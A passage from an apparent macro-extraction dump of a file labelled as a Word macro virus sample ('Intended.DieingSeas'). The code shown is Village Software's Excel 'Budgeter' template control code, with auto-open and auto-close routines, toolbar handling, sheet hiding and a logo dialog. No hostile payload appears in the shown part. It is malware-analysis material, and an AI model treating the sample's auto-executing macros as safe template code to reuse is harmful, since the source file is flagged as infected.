        Err = 0
        MarkCell_1.Select
    
    Case Else
        
        Msg = Univ_Error & Str(Err) & ": " & Error(Err)
        MsgBox Msg, vbCritical, SheetBar
        Err = 0
    
    End Select

End Sub



' ************************************
' * Calls to customized dialog boxes *
' ************************************


Sub VillageCredit()
'Village Software credits box

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg
    .Buttons.Visible = True
    .Show
  End With

End Sub

Sub Village_But1()

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg2
    .Buttons("CRED_SUP").Visible = False
    .Buttons("CRED_LIC").Visible = False
  End With
  
End Sub

Sub Village_But2()

  With Sheets("VDlg")
    .TextBoxes("PNL1_TXT1").Text = VIL_Dlg3
    .Buttons("CRED_SUP").Visible = False
    .Buttons("CRED_LIC").Visible = False
  End With
  
    
End Sub



Sub ChangeFont()
'Changes the font in the preview panels

  Dim Return_1 As Object

  If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then
    
    ShtMem = ActiveSheet.Index
    
    Sheets(Vital).Activate
    Set Return_1 = ActiveCell
    
    Sheets(Vital).Range("LTR").Select
    
    If Application.Dialogs(xlDialogActiveCellFont).Show Then
        With Selection.Font
            LetterFont = .Name
            LetterColor = .ColorIndex
            LetterSize = .Size
            LetterStyle = .FontStyle
            .Underline = xlNone
            PreviewPane
        End With
    End If
    
    Return_1.Select
    Sheets(ShtMem).Activate
  Else
  
    MsgBox LetterFont_Error, vbCritical, SheetBar
  End If

End Sub


Sub DocumentCell()
'Places a Cell Tip in the worksheet

    On Error GoTo Err_S:
    Selection.DataSeries
    
    If TypeName(Selection) = cRange Then
        Application.Dialogs(xlDialogNote).Show
    End If

Err_S:
End Sub



' ***************************************
' * Supporting procedures and functions *
' ***************************************


Function CheckScenarios(ScenarioName, Scenariopage)
'Checks if a scenario is in a worksheet, returns T/F
    
    CheckScenarios = False
    If Scenariopage > 0 Then
        For Each ThisScenario In Sheets(Scenariopage).Scenarios
            If ThisScenario.Name = ScenarioName Then
                CheckScenarios = True
            End If
        Next
     End If
     
End Function


Function ParentWorkbook(WorkbookName)
'Returns the template parent name of the input workbookname

    If UCase(Right(WorkbookName, 4)) = ".XLS" _
     Or UCase(Right(WorkbookName, 4)) = ".XLT" Then
        WorkbookName = Left(WorkbookName, Len(WorkbookName) - 4)
    End If
    
    If IsNumeric(Right(WorkbookName, 1)) Then
        ParentWorkbook = ParentWorkbook(Left(WorkbookName, Len(WorkbookName) - 1))
    Else
        ParentWorkbook = WorkbookName
    End If
    
End Function


Function SiblingWorkbooks(WorkbookName, NumberHurdle)
'Checks if any other "offspring" workbooks are present, returns name or null
'NumberHurdle is how many siblings need be concurrently open to return non-False

    i = 0
    SiblingWorkbooks = Null
    For Each ThisBook In Workbooks
        If UCase(WorkbookName) = Left(UCase(ThisBook.Name), Len(WorkbookName)) Then
            i = i + 1
            If TypeName(ActiveSheet) <> cNothing Then
                If ThisBook.Name <> ActiveWorkbook.Name Then
                    tEmp = ThisBook.Name
                End If
            End If
        End If
    Next
    
    If i > NumberHurdle Then
        SiblingWorkbooks = tEmp
    Else
        SiblingWorkbooks = Null
    End If
    
End Function


Function CheckBooks(BookName)
'Checks if a workbook is open, returns T/F

    NumberofWorkbooks = Application.Workbooks.Count
    CheckBooks = False
    For Each ThisBook In Workbooks
        If LCase(ThisBook.Name) = LCase(BookName) Then
            CheckBooks = True
        End If
    Next
       
End Function


Function CheckSheets(SheetName, ThisBookName)
'Checks if a sheet is in a workbook, returns T/F

    NumberofSheets = Workbooks(ThisBookName).Sheets.Count
    CheckSheets = False
    On Error Resume Next
    Set ThisSheet = Workbooks(ThisBookName).Sheets(SheetName)
    If TypeName(ThisSheet) <> cEmpty Then
        CheckSheets = True
    End If
       
End Function


Function NameIndex(RName)
'Checks to see if a name is in a sheet, returns index

    Dim Count As Integer
    Dim Loop1 As Integer
    
    Count = ActiveWorkbook.Names.Count
    NameIndex = False
    For Loop1 = 1 To Count
        If ActiveWorkbook.Names(Index:=Loop1).Name = RName Then
            NameIndex = Loop1
        End If
    Next
    
End Function


Function CheckBars(BarName)
'Checks if a toolbar is in a worksheet, returns T/F

    CheckBars = False
    On Error Resume Next
    Set ThisToolbar = Toolbars(BarName)
    If TypeName(ThisToolbar) <> cEmpty Then
        CheckBars = True
    End If
       
End Function


Function CheckAddIns(AddInName, AddInTitle)
'Checks if an addin is available to Excel, returns T/F

    CheckAddIns = False
    On Error GoTo NotLoadedTrap
    AddInTitle = Workbooks(AddInName).Title
    CheckAddIns = True
    Exit Function
    
NotLoaded:
    On Error GoTo CantLoadTrap
    Workbooks.Open Application.LibraryPath & Application.PathSeparator & AddInName
    AddInTitle = Workbooks(AddInName).Title
    CheckAddIns = True
    Exit Function
    
NotLoadedTrap:
    Resume NotLoaded
    
CantLoadTrap:
    CheckAddIns = False
    
End Function
    

Sub Unhide_Workbook(WBook)
'Unhides a hidden workbook, called on closedown

    For Each ThisWindow In Windows
        WWind = Trim(ThisWindow.Caption)
        If Not IsError(Application.Search(":", WWind)) Then
            WWind = Left(WWind, Application.Find(":", WWind) - 1)
        End If
        If WWind = WBook Then
            If ThisWindow.Visible = False Then _
             ThisWindow.Visible = True
        End If
    Next

End Sub


Function ZoomFactor()
'Returns the proper default zoom factor for the user's display
 
    Select Case ActiveWindow.Width
        Case 1 To 600
            ZoomFactor = Zoom1
        Case 601 To 1050
            ZoomFactor = Zoom2
        Case Else
            ZoomFactor = Zoom3
    End Select
    
End Function


Function FlName(PathName)
'Returns the file name from a full path name

    If InStr(PathName, Application.PathSeparator) > 0 Then
        FlName = FlName(Right(PathName, Len(PathName) - InStr(PathName, Application.PathSeparator)))
    Else
        FlName = PathName
    End If

End Function


Sub Nada()
'This area intentionally left blank
End Sub
 
 
Sub NotAvail()
 
        MsgBox NotAvail_String, vbOKOnly + vbInformation, SheetBar
 
End Sub


Sub Help()
'Call to help file

  Application.Help Application.Path & Application.PathSeparator & File_Help & ".hlp", 6

End Sub



' ***************************************************
' * Procedures specific to this particular template *
' ***************************************************



Sub Specific_CheckSheet()
'Template specific routines to be run in CheckSheet

End Sub


Sub Specific_AutoStart()

End Sub


Sub Specific_AutoStop()

End Sub


Sub BUD_ChangeGraph()
'change the graph type
    
    On Error GoTo Err_A
    ActiveSheet.ChartObjects("BUDGRPH").Activate
    Application.Dialogs(xlDialogGallery3dPie).Show
    ActiveSheet.Activate
    Exit Sub
    
Err_A:
    
    MsgBox Graph_Error, vbOKOnly + vbCritical, SheetBar
    Err = 0
    On Error GoTo 0

End Sub













-------------------------------------------------------------------------------
VBA MACRO UserModule01.bas 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/UserModule01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


' ********************************************
' *     MS-Excel Template Control Code       *
' * Copyright(c)1994-6 Village Software, Inc.*
' *           All Rights Reserved            *
' *      LICENSED FOR END-USER USE ONLY.     *
' *  CODE MAY NOT BE INCLUDED IN COMMERCIAL  *
' *   THIRD PARTY APPLICATIONS WITHOUT THE   *
' *     EXPRESSED WRITTEN CONSENT OF         *
' *        VILLAGE SOFTWARE, INC.            *
' *                                          *
' *               Version 7.5                *
' ********************************************

' These routines control the behavior of the toolbars,
' buttons, and other user-interface elements of the
' MS-Excel 95 templates


' ****************************************************
' * Global options, types, declarations, & constants *
' ****************************************************

    Option Base 1
    
    Public LetterFont As String
    Public LetterStyle As String
    Public LetterColor As Integer
    Public LetterSize As Integer

    Public UnqNumber As Variant
    Public Cloak_Next As Boolean
    Global BookName As String
    Global FullBookName As String
    Global Sep As String 'Sep Change MAC
    Global CRet As String 'LT Change MAC
    
    Const SheetBar = "Budgeter"
    Const Vital = "Customize Your Budgeter"
    Const Content1 = "Budget Summary"
    
    Const Lock_String = "Lock/Save Sheet"
    Const Lock_Text = "You can lock the information on the Customize page and save your customized version of the template."
    Const Unlock_String = "Unlock This Sheet"
    Const Unlock_Text = "By unlocking this sheet, you enable changes to be made to the information on the Customize sheet. Select ""Lock This Sheet"" after you make your changes to protect the sheet from accidental changes."
    Const Save_Alrt = "Your new customized template has been saved to the directory "
    Const Save_Alrt2 = ".  To begin use, click Close from the File menu and then click New to open your template."
    Const Save_Filter = "Templates,*.xlt"
    Const Save_Title = "Save Template"
    
    Const FinePrint_String = "Enter the text to appear in the Fine Print box:"
    Const FareWellStmnt_String = "Enter the text to appear in the Farewell Statement box:"
    Const NotAvail_String = "This feature is not available in this version of Excel."
    Const Erase_String = "Your current data will be overwritten.  Do you want to continue?"

    Const FinePrint_BoxName = "Fine Print"
    Const FareWellStmnt_BoxName = "Farewell Statement"

    Const Logo_Error = "You must unlock the Customize sheet to change the logo for this template."
    Const LetterFont_Error = "You must unlock the Customize sheet to change the lettertype for this template."
    Const Univ_Error = "Unexpected Error #"

    Const Graph_Error = "Sorry.  You cannot make that chart selection.  Please try a different chart type."
        
    Const GoalSk_Bar = "Change the size of this bar or another bar..."
    Const GoalSk_Pie = "Change the size of this slice or another slice..."
    
    Const SQ_DB_Loc = "There is no Common database in the specified directory.  Please reset the database location in the Customize page."
    Const SQ_DB_Struc = "This database structure is not compatible with the template.  Please restore original structure."
    Const SQ_DB_CatTitle = "Product and Service Catalog"
    Const SQ_DB_CatItem = "Product/Service Name"
    Const SQ_DB_EmpTitle = "Employee Info"
    Const SQ_DB_EmpItem = "Employee Name"
 
    Const VIL_Ttl = "Village Software"

    Const VIL_Dlg = "Village Software provides a variety of business and financial desktop solutions for Excel and Office.  For a free catalog, call 800-724-9332 or come to our Web site. (http://www.villagesoft.com)"
    Const VIL_Dlg2 = "No free telephone support is offered for these online templates.  A support package is available at a nominal charge from Village Software.  Call 800-724-9332 to purchase this plan and/or template upgrades."
    Const VIL_Dlg3 = "These online templates are copyrighted, licensed software, intended to be used as-is.  They may NOT be placed in shareware libraries or embedded in commercial applications without the written consent of Village Software, Inc."
    
    Const EmpDlg = "Select Employee"
    Const LockDlg = "Lock"
    Const CredDlg = "Credits"
    
    Const ZoomButton = 1
    Const TipButton = 2
    Const DocButton = 3
    Const HelpButton = 4
    Const SampleButton = 5
    Const SplitButton = 6
    Const CalcButton = 7
    Const CredButton = 8
 
    Const Zoom1 = 80
    Const Zoom2 = 95
    Const Zoom3 = 105
    
    Const DatabasePathCell = "B3"
    Const LocalizationCell = "LOC"
    Const SampleStateCell = "SS"
    Const ToolbarStateCell = "NS"
    Const CommonDBPathCell = "CDB"
    Const ContentSheetCell = "CS"
    
    Const File_Help = "VSTMPLT"
    Const File_DB = "COMMON"

    Const Cloak = True
    Const Default_Font = "Arial"

    Const cRange = "Range"
    Const cWorksheet = "Worksheet"
    Const cDialogsheet = "DialogSheet"
    Const cNothing = "Nothing"
    Const cEmpty = "Empty"



' ***********************************
' * Automatic execution procedures  *
' ***********************************


Sub Auto_Op()
Attribute Auto_Op.VB_ProcData.VB_Invoke_Func = " \n14"
'Initializes the worksheet properties

    Application.ScreenUpdating = False
    ThisWorkbook.Activate
    PostXL5 = (Int(Left(Application.Version, 1)) > 5)
    MacXL = (UCase(Left(Application.OperatingSystem, 3)) = "MAC")
    
    If MacXL Then Sheets(Vital).DrawingObjects("LGBUT").OnAction = "NotAvail"
    
    If CheckBars(SheetBar) Then
      If Not PostXL5 Then 'Sep Change XL5
        Sep = "" 'Sep Change MAC
      Else  'Sep Change MAC
        Sep = Application.PathSeparator 'Sep Change MAC
      End If
      
      If MacXL Then Toolbars(SheetBar).ToolbarButtons(CalcButton).OnAction = "NotAvail" 'Toolbar Change MAC
        Toolbars(SheetBar).ToolbarButtons(ZoomButton).OnAction = "PageZoom"
        Toolbars(SheetBar).ToolbarButtons(TipButton).OnAction = "CellTipDisplay"
        Toolbars(SheetBar).ToolbarButtons(DocButton).OnAction = "DocumentCell"
        Toolbars(SheetBar).ToolbarButtons(HelpButton).OnAction = "Help"
        Toolbars(SheetBar).ToolbarButtons(SampleButton).OnAction = "ToggleSample"
        Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = "SplitWindow"
        Toolbars(SheetBar).ToolbarButtons(CredButton).OnAction = "VillageCredit"
    End If


    With ActiveWorkbook
      .OnSheetActivate = "CheckSheet"
      .OnSheetDeactivate = "CloakSheet"
    End With
    ActiveWindow.OnWindow = "CheckWindow"
    
    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then ThisSheet.OnEntry = "CheckEntry"
      If TypeName(ThisSheet) = cDialogsheet Then
        For Each dTextbox In ThisSheet.TextBoxes
          If dTextbox.Font.Size = 8 And MacXL Then dTextbox.Font.Size = 9
        Next
      End If
    Next
   
    LetterFont = Default_Font
    Application.DisplayNoteIndicator = True
    
    FullBookName = ActiveWorkbook.Name
    BookName = ParentWorkbook(FullBookName)
    
    AutoScale
    
    'Range(LocalizationCell) = Application.International(1)
'    Range(ContentSheetCell) = Sheets(Content1).Name
    
   ' Specific_AutoStart
    
    'Application.ScreenUpdating = True
    
End Sub

       


Sub Auto_cl()
Attribute Auto_cl.VB_ProcData.VB_Invoke_Func = " \n14"
'Orderly closedown/pass-off of toolbars, etc.

    Unhide_Workbook ThisWorkbook.Name

    If CheckBars(SheetBar) Then
        
        If BookName = "" Then
            BookName = ParentWorkbook(ActiveWorkbook.Name)
        End If
        
        If IsNull(SiblingWorkbooks(BookName, 1)) Then
            Toolbars(SheetBar).Delete
            Application.OnWindow = ""
        Else
            TransName = SiblingWorkbooks(BookName, 1)
            Toolbars(SheetBar).ToolbarButtons(ZoomButton).OnAction = _
              TransName & "!PageZoom"
            Toolbars(SheetBar).ToolbarButtons(TipButton).OnAction = _
              TransName & "!CellTipDisplay"
            Toolbars(SheetBar).ToolbarButtons(DocButton).OnAction = _
              TransName & "!DocumentCell"
            Toolbars(SheetBar).ToolbarButtons(HelpButton).OnAction = _
              TransName & "!Help"
            Toolbars(SheetBar).ToolbarButtons(SampleButton).OnAction = _
              TransName & "!ToggleSample"
            Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = _
              TransName & "!SplitWindow"
            Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = _
              TransName & "!VillageCredit"
            If MacXL Then Toolbars(SheetBar).ToolbarButtons(CalcButton).OnAction = _
              TansName & "!NotAvail" 'Toolbar Change MAC
            
            If Windows(TransName).Visible = False Then
                Toolbars(SheetBar).Visible = False
            End If


        End If
    End If
    
    Specific_AutoStop
       
End Sub


Sub CheckSheet()
Attribute CheckSheet.VB_ProcData.VB_Invoke_Func = " \n14"
'Executed on worksheet changes

    If BookName = "" Then
        FullBookName = ActiveWorkbook.Name
        BookName = ParentWorkbook(ActiveWorkbook.Name)
    End If
    
    Specific_CheckSheet
  
    'update status bars
    If CheckBars(SheetBar) Then
    
      Range(ToolbarStateCell) = Toolbars(SheetBar).Visible
      
      If TypeName(ActiveSheet) = cWorksheet And ActiveWindow.Type = xlWorkbook Then
        
        'update zoom status
        Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = (ActiveWindow.Zoom < ZoomFactor)

        'update split/freeze status
        If SplitButton > 0 Then
            Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = ActiveWindow.FreezePanes
        End If

        'update sample status
        Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed = Range(SampleStateCell)
       
        'update celltip display status
        Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed = Not Application.DisplayNoteIndicator
    
      Else
        For i = 1 To 6
            With Toolbars(SheetBar).ToolbarButtons(i)
                If .Enabled Then .Pushed = False
            End With
        Next
      End If
    End If
   
End Sub


Sub CloakSheet()
Attribute CloakSheet.VB_ProcData.VB_Invoke_Func = " \n14"
'manages hiding of vital sheet and closing of toolbars


    If CheckBars(SheetBar) Then
        On Error Resume Next
        Workbooks(FullBookName).Sheets(Vital).Range(ToolbarStateCell) = Toolbars(SheetBar).Visible
        On Error GoTo 0
    End If
    
    'hides vital sheet
    On Error Resume Next
    If ActiveWindow.Type <> xlInfo Then
      On Error GoTo 0
      If TypeName(ActiveSheet) <> cNothing Then
        WorkbookName = ActiveWorkbook.Name
        If UCase(Right(WorkbookName, 4)) = ".XLS" _
         Or UCase(Right(WorkbookName, 4)) = ".XLT" Then _
         WorkbookName = Left(WorkbookName, Len(WorkbookName) - 4)
        If WorkbookName = FullBookName Then
            If ActiveSheet.Name <> Vital Then
                If Cloak_Next = True And Cloak = True Then
                    Sheets(Vital).Visible = False
                    Cloak_Next = False
                    Specific_AutoStart
                End If
            Else
                Cloak_Next = True
            End If
        End If
      End If
    End If
    On Error GoTo 0
    
    'closes old bar down
    If TypeName(ActiveWorkbook) = cNothing Then
        If CheckBars(SheetBar) Then
            Toolbars(SheetBar).Visible = False
        End If
    Else
        If BookName <> Left(ActiveWorkbook.Name, Len(BookName)) Then
            If CheckBars(SheetBar) Then
                Toolbars(SheetBar).Visible = False
            End If
        Else
            If LCase(Left(Right(ActiveWorkbook.Name, 12), 8)) = "database" Then
                If CheckBars(SheetBar) Then
                    Toolbars(SheetBar).Visible = False
                End If
            End If
        End If
    End If
        
End Sub


Sub CheckWindow()
Attribute CheckWindow.VB_ProcData.VB_Invoke_Func = " \n14"

    If CheckBars(SheetBar) Then
        If LCase(BookName) = LCase(Left(ActiveWorkbook.Name, Len(BookName))) _
         And LCase(Right(Trim(ActiveWorkbook.Name), 8)) <> "database" _
         And ActiveWindow.Type <> xlChartInPlace Then
            Toolbars(SheetBar).Visible = Range(ToolbarStateCell)
            CheckSheet
        Else
            Toolbars(SheetBar).Visible = False
        End If
    End If
    Application.StatusBar = False
    
End Sub


Sub CheckEntry()
Attribute CheckEntry.VB_ProcData.VB_Invoke_Func = " \n14"
'Executed on any entry in any cell

    If ActiveSheet.Name = Vital Then
        If LetterSize = 0 Then
            LetterSize = 10
        End If
        PreviewPane
    Else
        If TypeName(ActiveSheet) = cWorksheet Then
            ArrangeEntries
        End If
    End If
        
End Sub


Sub AutoScale()
Attribute AutoScale.VB_ProcData.VB_Invoke_Func = " \n14"
'scales the default zoom factor to the user's monitor size

    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then
        ThisSheet.Activate
        ActiveWindow.Zoom = ZoomFactor
      End If
    Next
    
    ActiveWindow.ScrollWorkbookTabs Position:=xlFirst
    'Sheets(Content1).Activate
    
End Sub



' *******************************************
' *  Button and Toggle/States support code  *
' *******************************************


Sub PageZoom()
Attribute PageZoom.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls Zoom toolbar button

  If TypeName(ActiveSheet) = cWorksheet And TypeName(Selection) = cRange Then

    On Error GoTo Err_1
    
    Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = _
     Not Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed

    If Not Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed Then
        ActiveWindow.Zoom = ZoomFactor
    Else
        Application.ScreenUpdating = False
        Set ThisCell = ActiveCell
        Range("Print_Area").Select
        ActiveWindow.Zoom = True
        ThisCell.Select
        'Application.ScreenUpdating = True
    End If
  
  End If
  On Error GoTo 0
  Exit Sub

Err_1:

  Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = False
  'Application.ScreenUpdating = True
  Err = 0
  On Error GoTo 0

End Sub



Sub ToggleSample()
Attribute ToggleSample.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls Sample toobar button
      
    On Error GoTo Err_S:
    Selection.DataSeries
      
    Application.ScreenUpdating = False
    Set StartSheet = ActiveSheet
 
    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then
        ThisSheet.Activate
        If TypeName(Selection) <> cRange Then ThisSheet.Range("A1").Select
        PIndex = ThisSheet.Index
        For Each ThisScen In ThisSheet.Scenarios
            TName = ThisScen.Name
            TIndex = ThisScen.Index
            If Left(TName, 6) = "sample" Then
              If Int(Left(Application.Version, 1)) > 5 Then
                Set SelCells = Sheets(PIndex).Scenarios(TName).ChangingCells
              Else
                tEmp = ExecuteExcel4Macro("SCENARIO.GET(2," & Chr(34) & ThisScen.Name & Chr(34) & ")")
                Set SelCells = Range(tEmp)
              End If
              ScenNo = Right(TName, Len(TName) - 6)
              ScenName = "current" & Trim(ScenNo)
              If Range(SampleStateCell).Value = False Then

                  If CheckScenarios(ScenName, PIndex) Then
                      ThisSheet.Scenarios(ScenName).Delete
                  End If
    
                  Sheets(PIndex).Scenarios.Add ScenName, SelCells
                  ThisScen.Show
              Else
                  ThisSheet.Scenarios(ScenName).Show
              End If

            End If
        Next
      End If
    Next

    Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed
      
    Range(SampleStateCell).Value = _
    Not Range(SampleStateCell).Value
    
    StartSheet.Activate
    'Application.ScreenUpdating = True

Err_S:
End Sub



Sub CellTipDisplay()
Attribute CellTipDisplay.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls the CellTip Display button on the toolbar
    
  If TypeName(ActiveSheet) = cWorksheet And ActiveWindow.Type = xlWorkbook Then
    
    Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed

    If Not Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed Then
        Application.DisplayNoteIndicator = True
    Else
        Application.DisplayNoteIndicator = False
    End If
    
  End If
    
End Sub



Sub SplitWindow()
Attribute SplitWindow.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls the Split button on the toolbar, toggles split on active cell
        
  If TypeName(ActiveSheet) = cWorksheet And TypeName(Selection) = cRange _
   And ActiveWindow.WindowState <> xlMinimized Then
            
    Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed

    Application.ScreenUpdating = False
    
    If Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed Then
        If ActiveCell.Row > ActiveWindow.ScrollRow Then
            With ActiveWindow
                .SplitColumn = 0
                .SplitRow = ActiveCell.Row - ActiveWindow.ScrollRow
            End With
            ActiveWindow.FreezePanes = True
        Else
            Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = False
        End If
    
    Else
        
        With ActiveWindow
            .SplitColumn = 0
            .SplitRow = 0
        End With

    End If
    'Application.ScreenUpdating = True
  
  End If

End Sub



Sub LockSheet()
Attribute LockSheet.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls the Lock Sheet button on the Vitals page
 
    If Int(Left(Application.Version, 1)) < 7 Then  'XL5 change!
        Sheets(LockDlg).OptionButtons("LCK_2").Enabled = False
        Sheets(LockDlg).OptionButtons("LCK_1").Value = xlOn
    End If
    

    If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then
      
      If DialogSheets(LockDlg).Show Then
        Sheets(Vital).Protect DrawingObjects:=True, Contents:=True
        Sheets(Vital).DrawingObjects("Lock").Caption = Unlock_String
        Sheets(LockDlg).DialogFrame.Caption = Unlock_String
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Text = Unlock_Text
        Sheets(LockDlg).GroupBoxes("PNL2").Visible = False
        Sheets(LockDlg).OptionButtons("LCK_1").Visible = False
        Sheets(LockDlg).OptionButtons("LCK_2").Visible = False
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Height = 80
        If Sheets(LockDlg).OptionButtons("LCK_2").Value = xlOn Then
          ThisDir = CurDir()
          TempDir = Application.TemplatesPath
          ChDrive Mid(TempDir, 1, 1)
          ChDir TempDir
          FileNm = Application.GetSaveAsFilename(FileFilter:=Save_Filter, Title:=Save_Title)
          If FileNm <> False Then
            OWFlg = Application.DisplayAlerts
            Application.DisplayAlerts = False
            ActiveWindow.ScrollWorkbookTabs Position:=xlFirst
            Sheets(Content1).Activate
            Sheets(Vital).Visible = False
            With ActiveWorkbook
                .SaveAs FileName:=FileNm, FileFormat:=xlTemplate
                FName = .FullName
                PName = .Path
            End With
            Application.DisplayAlerts = OWFlg
            MsgBox Save_Alrt & PName & Save_Alrt2, vbOKOnly + vbInformation, SheetBar
          End If
          ChDrive Mid(ThisDir, 1, 1)
          ChDir ThisDir
        End If
      End If
                        
    Else
        
      If DialogSheets(LockDlg).Show Then
        Sheets(Vital).Unprotect
        Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String
        Sheets(LockDlg).DialogFrame.Caption = Lock_String
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Text = Lock_Text
        Sheets(LockDlg).GroupBoxes("PNL2").Visible = True
        Sheets(LockDlg).OptionButtons("LCK_1").Visible = True
        Sheets(LockDlg).OptionButtons("LCK_2").Visible = True
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Height = 40
      End If
    
    End If

End Sub



Sub Customize()
Attribute Customize.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls Customize button on any Content Page

    Cloak_Next = True
    Sheets(Vital).Visible = True
    Sheets(Vital).Select
    CheckSheet

End Sub



Sub FinePrint()
Attribute FinePrint.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls the Fine Print area on the any Content page

    FineText = InputBox(FinePrint_String, _
        FinePrint_BoxName, ActiveSheet.DrawingObjects("FP").Characters.Text)
    ActiveSheet.DrawingObjects("FP").Characters.Text = FineText
    
End Sub



Sub FareWellStmnt()
Attribute FareWellStmnt.VB_ProcData.VB_Invoke_Func = " \n14"
'Controls the Farewell Statement area on any Content page

    FWSText = InputBox(FareWellStmnt_String, _
        FareWellStmnt_BoxName, ActiveSheet.DrawingObjects("FS").Characters.Text)
    ActiveSheet.DrawingObjects("FS").Characters.Text = FWSText
    
End Sub




' *********************************************************
' * Procedures which manage the logo and lettertype boxes *
' *********************************************************


Sub InsertLogo()
Attribute InsertLogo.VB_ProcData.VB_Invoke_Func = " \n14"
'Lets the user insert a custom logo

  Dim LoopL As Integer
  Dim LogpPic As Variant
  Dim Err_Flg As Boolean

  If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then

    ShtMem = ActiveSheet.Index

    Sheets(Vital).Activate
    Set Mem = ActiveCell

    With ActiveSheet.DrawingObjects("LG")
        lgl = .Left
        lgt = .Top
        lgw = .Width
        lgh = .Height
    End With

    On Error GoTo Err_1B
    
    If Application.Dialogs(xlDialogInsertPicture).Show Then

      Application.ScreenUpdating = False

      ActiveSheet.DrawingObjects("LG").Delete

      On Error GoTo Err_2

      With Selection
        .Left = lgl
        .Top = lgt
        .Width = lgw
        .Height = lgh
        .Width = lgw
        .Name = "LG"
        .OnAction = "Nada"
        .Copy
      End With

      Mem.Select

      For Each ThisSheet In Sheets
        If TypeName(ThisSheet) = cWorksheet Then

          ThisSheet.Activate
          Set Mem = ActiveCell
          ActiveSheet.DrawingObjects("LG").Select

          If Not Err_Flg Then

            With ActiveSheet.DrawingObjects("LG")
                lgl = .Left
                lgt = .Top
                lgw = .Width
                lgh = .Height
                .Delete
            End With

            ActiveSheet.Paste

            With Selection
                .Left = lgl
                .Top = lgt
                .Width = lgw
                .Height = lgh
                .Name = "LG"
                .OnAction = "Nada"
            End With

          Else
            Err_Flg = False
          End If

          Mem.Select
        End If
      Next

      Sheets(ShtMem).Activate
    End If

  Else

    MsgBox Logo_Error, vbCritical, SheetBar
  
  End If
      
  On Error GoTo 0
  'Application.ScreenUpdating = True
  Exit Sub
    
Err_1B:

  MsgBox Error(Err), vbCritical + vbOKOnly, SheetBar
  Err = 0
  'Application.ScreenUpdating = True
  On Error GoTo 0
  Exit Sub

Err_2:
    
  If Err <> 1004 And Err <> 1006 Then

    Msg = Univ_Error & Str(Err) & ": " & Error(Err)
    MsgBox Msg, vbCritical, SheetBar
    Err = 0
  Else
    Err_Flg = True
    Err = 0
    Resume Next
  End If

  Sheets(ShtMem).Activate
  On Error GoTo 0
  'Application.ScreenUpdating = True

End Sub


Sub PreviewPane()
Attribute PreviewPane.VB_ProcData.VB_Invoke_Func = " \n14"
'Adds text into the preview panels dynamically

  Dim Len1 As Integer
  Dim String1 As String
  Dim Thisbox As Variant
  Dim LoopA As Integer

  'Application.ScreenUpdating = False
  
  If UCase(Left(Application.OperatingSystem, 3)) = "MAC" Then 'LT change MAC
    CRet = Chr(13)
  Else
    CRet = Chr(10)
  End If
  

  Len1 = Sheets(Vital).Range("vital1").Characters.Count

  If Not IsEmpty(Range("vital4")) And Not IsEmpty(Range("vital5")) Then
    Comma = ", "
  Else
    Comma = ""
  End If

  If Not IsEmpty(Range("vital9")) Then
    Fax = " fax "
  Else
    Fax = ""
  End If
    
  String1 = Sheets(Vital).Range("vital1").Value & CRet _
    & Sheets(Vital).Range("vital2").Value & CRet _
    & Sheets(Vital).Range("vital4").Value & Comma & Sheets(Vital).Range("vital5").Value & "  " & Sheets(Vital).Range("vital6").Value _
    & CRet & Sheets(Vital).Range("vital8").Value & Fax & Sheets(Vital).Range("vital9") 'LT Change MAC

  On Error GoTo Err_2B

  For Each ThisSheet In Sheets
    If TypeName(ThisSheet) = cWorksheet Then

      ThisSheet.DrawingObjects("LT").Characters.Text = String1

      If Err_Flg = False Then
        With ThisSheet.DrawingObjects("LT").Characters.Font
          .Name = LetterFont
          .ColorIndex = LetterColor
          .Size = LetterSize
          .Strikethrough = False
          .Superscript = False
          .Subscript = False
          .OutlineFont = False
          .Shadow = False
          .Underline = xlNone
          .FontStyle = LetterStyle
        End With

        With ThisSheet.DrawingObjects("LT").Characters(Start:=1, Length:=Len1).Font
          .Size = LetterSize + 10
          .FontStyle = LetterStyle
        End With

      Else
        Err_Flg = False
      End If
    End If
  Next

  On Error GoTo 0
  'Application.ScreenUpdating = True
